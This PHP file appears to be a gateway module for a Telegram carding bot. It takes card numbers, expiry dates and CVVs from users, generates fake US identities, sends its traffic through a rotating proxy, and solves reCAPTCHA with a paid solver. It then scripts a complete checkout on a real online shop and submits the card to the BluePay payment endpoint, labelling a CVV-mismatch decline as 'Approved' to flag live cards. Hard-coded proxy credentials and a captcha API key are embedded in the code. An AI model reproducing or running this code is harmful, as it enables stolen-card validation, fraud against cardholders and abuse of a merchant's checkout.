<?php
require __DIR__ . "/../Class/Capsolver/autoload.php";

$gatewayname="blu";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
//==================[Inicializacion de variables]======================//
$messages = $bot->loadPlantillas();
$gateway = "#Bluepay_Charged (".'$20'.")";
$lang = $db->getUserLanguage($userId);
//==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($year) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    
 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
$socks5 = "gw.dataimpulse.com:823";
$rotate = "b097452cc0d2c2bcc268:7580f00952ea0161";

$cookie = uniqid();


$proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

 //==================[Curl Request]======================//
 $response = CurlX::Post(
    "https://shop.fiberopticresale.com/index.php?route=checkout/cart/add",
    'quantity=1&product_id=601',
    [
        'accept: application/json, text/javascript, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/jonard-kn-7-ergonomic-calbe-splicing-knife',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);

$headers = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer: https://shop.fiberopticresale.com/jonard-kn-7-ergonomic-calbe-splicing-knife',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
];
$request = CurlX::Get('https://shop.fiberopticresale.com/index.php?route=checkout/cart', $headers, $cookie, $proxies,'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'');

$headers = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer: https://shop.fiberopticresale.com/jonard-kn-7-ergonomic-calbe-splicing-knife',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
];
$request = CurlX::Get('https://shop.fiberopticresale.com/index.php?route=checkout/checkout', $headers, $cookie, $proxies, 'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'');



$response = CurlX::Get(
    "https://shop.fiberopticresale.com/index.php?route=checkout/login",
    [
        'accept: text/html, */*; q=0.01',
        'accept-language: es-419,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'sec-ch-ua-mobile: ?0',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
        'x-requested-with: XMLHttpRequest'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Get(
    "https://shop.fiberopticresale.com/index.php?route=checkout/register",
    [
        'accept: text/html, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);


$response = CurlX::Get(
    "https://shop.fiberopticresale.com/index.php?route=checkout/checkout/customfield&customer_group_id=1",
    [
        'accept: application/json, text/javascript, */*; q=0.01',
        'accept-language: es-419,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
        'x-requested-with: XMLHttpRequest'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Get(
    "https://shop.fiberopticresale.com/index.php?route=checkout/checkout/country&country_id=223",
    [
        'accept: application/json, text/javascript, */*; q=0.01',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
        'x-requested-with: XMLHttpRequest'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$solver = new \Capsolver\CapsolverClient('CAP-0DC8A5669BCC3BACE0A04D2AA3C14585');


$solution = $solver->recaptchav2(
    \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
    [
        'websiteURL'    => 'https://shop.fiberopticresale.com',
        'websiteKey'    => '6Lc6R_QfAAAAAHvo3_CCwUJfAZQaASAMP4JkB2R7',
    ]
);

$captcha = $solution["gRecaptchaResponse"];

$response = CurlX::Post(
    "https://shop.fiberopticresale.com/index.php?route=checkout/register/save",
    'customer_group_id=1&firstname=alex&lastname=frick&email='.urlencode($email).'&telephone='.urlencode($phone).'&password='.urlencode($password).'&confirm='.urlencode($password).'&company='.urlencode($firstName).'&address_1='.urlencode($street).'&address_2=&city='.urlencode($city).'&postcode='.$zip.'&country_id=223&zone_id=3669&g-recaptcha-response='.$captcha.'&shipping_address=1',
    [
        'accept: application/json, text/javascript, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Get(
    "https://shop.fiberopticresale.com/index.php?route=checkout/shipping_address",
    [
        'accept: text/html, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Get(
    "https://shop.fiberopticresale.com/index.php?route=checkout/payment_address",
    [
        'accept: text/html, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Get(
    "https://shop.fiberopticresale.com/index.php?route=checkout/checkout/country&country_id=223",
    [
        'accept: application/json, text/javascript, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Get(
    "https://shop.fiberopticresale.com/index.php?route=checkout/checkout/country&country_id=223",
    [
        'accept: application/json, text/javascript, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Post(
    "https://shop.fiberopticresale.com/index.php?route=checkout/shipping_address/save",
    'shipping_address=existing&address_id=563&firstname=&lastname=&company=&address_1=&address_2=&city=&postcode=75201&country_id=223&zone_id=3669',
    [
        'accept: application/json, text/javascript, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Get(
    "https://shop.fiberopticresale.com/index.php?route=checkout/shipping_method",
    [
        'accept: text/html, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Get(
    "https://shop.fiberopticresale.com/index.php?route=checkout/shipping_address",
    [
        'accept: text/html, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Get(
    "https://shop.fiberopticresale.com/index.php?route=checkout/payment_address",
    [
        'accept: text/html, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Get(
    "https://shop.fiberopticresale.com/index.php?route=checkout/checkout/country&country_id=223",
    [
        'accept: application/json, text/javascript, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Get(
    "https://shop.fiberopticresale.com/index.php?route=checkout/checkout/country&country_id=223",
    [
        'accept: application/json, text/javascript, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Post(
    "https://shop.fiberopticresale.com/index.php?route=checkout/shipping_method/save",
    'shipping_method=weight.weight_5&comment=',
    [
        'accept: application/json, text/javascript, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Get(
    "https://shop.fiberopticresale.com/index.php?route=checkout/payment_method",
    [
        'accept: text/html, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Post(
    "https://shop.fiberopticresale.com/index.php?route=checkout/payment_method/save",
    'payment_method=bluepay_redirect&comment=&agree=1',
    [
        'accept: application/json, text/javascript, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Get(
    "https://shop.fiberopticresale.com/index.php?route=checkout/confirm",
    [
        'accept: text/html, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

$response = CurlX::Post(
    "https://shop.fiberopticresale.com/index.php?route=extension/payment/bluepay_redirect/send",
    'CC_NUM='.$cc.'&CC_EXPIRES_MONTH='.$mes.'&CC_EXPIRES_YEAR='.$ano.'&CVCCVV2='.$cvv.'',
    [
        'accept: application/json, text/javascript, */*; q=0.01',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://shop.fiberopticresale.com/index.php?route=checkout/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
    'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''
);

 //==================[Manejo de los mensajes]======================//
$errormessage = CurlX::ParseString($response->body,'{"error":"','"');
if($errormessage=="null"){
    $errormessage = "There was a problem processing the request";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
} 

 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//

 if($errormessage == "DECLINED : INV CVV2 MATCH"){
    
    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
       " $errormessage",
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
